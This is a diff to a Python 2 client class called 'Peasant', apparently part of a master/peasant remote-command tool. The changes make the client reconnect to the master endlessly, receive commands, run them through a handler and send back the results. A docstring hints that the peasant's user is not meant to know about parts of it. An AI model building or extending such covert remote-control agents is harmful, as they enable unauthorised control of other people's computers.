@@ -16,8 +16,8 @@ class Peasant(object):
                master own directory that the peasant's user shouldn't know about.
         :param debug: debug mode (True-on, False-off)
         """
-        # open a TCP\IP socket
-        self.__socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        # declare a socket
+        self.__socket = None
         # the masters' ip
         self.__IP = ip
         # the masters' port
@@ -42,7 +42,7 @@ class Peasant(object):
         if not request_size:
             print "Master Has Been Closed"
             # TODO: close the peasant and start the run function all over again
-            return 0
+            return False
         # fix the request's length
         request_size = int(request_size) - Commands.COMMAND_LENGTH
         # get the request's command's number
@@ -55,7 +55,7 @@ class Peasant(object):
         print args
         # handle the command and add the command number and return value to the responses list
         self.__responses.append(str(command) + Commands.handle_command_request(command, args))
-        return 1
+        return True
 
     def __send_responses(self):
         """
@@ -83,40 +83,45 @@ class Peasant(object):
         execute them and send results to the master.
         :return: nothing, void.
         """
-        # try to connect to the master until successfully connected
+        # while the computer is on
         while True:
-            try:
-                print "Connecting"
-                self.__socket.connect((self.__IP, self.__PORT))
-            except socket.timeout:
-                continue
-            except socket.error:
-                continue
-            else:
-                break
-        print "CONNECTED!"
+            # open a TCP\IP socket
+            self.__socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-        # the master command
-        command = ""
-        # while the master didn't close the connection with the peasant
-        # and there aren't any requests to handle
-        # and there aren't any responses to send to the master
-        while not command.upper() == 'EXIT':
-            # select - check if can receive or send to the master
-            rlist, wlist, xlist = select([self.__socket], [self.__socket], [])
+            # try to connect to the master until successfully connected
+            while True:
+                try:
+                    print "Connecting"
+                    self.__socket.connect((self.__IP, self.__PORT))
+                except socket.timeout:
+                    continue
+                except socket.error:
+                    continue
+                else:
+                    break
+            print "CONNECTED!"
 
-            # if can receive from the master a command
-            if self.__socket in rlist:
-                # receive the master's request
-                self.__receive_request()
+            # if the connection is still alive
+            keep_alive = True
+            # while the master didn't close the connection with the peasant
+            # and there aren't any requests to handle
+            # and there aren't any responses to send to the master
+            while keep_alive:
+                # select - check if can receive or send to the master
+                rlist, wlist, xlist = select([self.__socket], [self.__socket], [])
 
-            # if can send responses to the master, send them.
-            if self.__socket in wlist:
-                # send the response to the master
-                self.__send_responses()
+                # if can receive from the master a command
+                if self.__socket in rlist:
+                    # receive the master's request
+                    keep_alive = self.__receive_request()
 
-        # close the connection and the socket
-        self.__socket.close()
+                # if can send responses to the master, send them.
+                if self.__socket in wlist:
+                    # send the response to the master
+                    self.__send_responses()
+
+            # close the connection and the socket
+            self.__socket.close()
 
 
 if __name__ == '__main__':
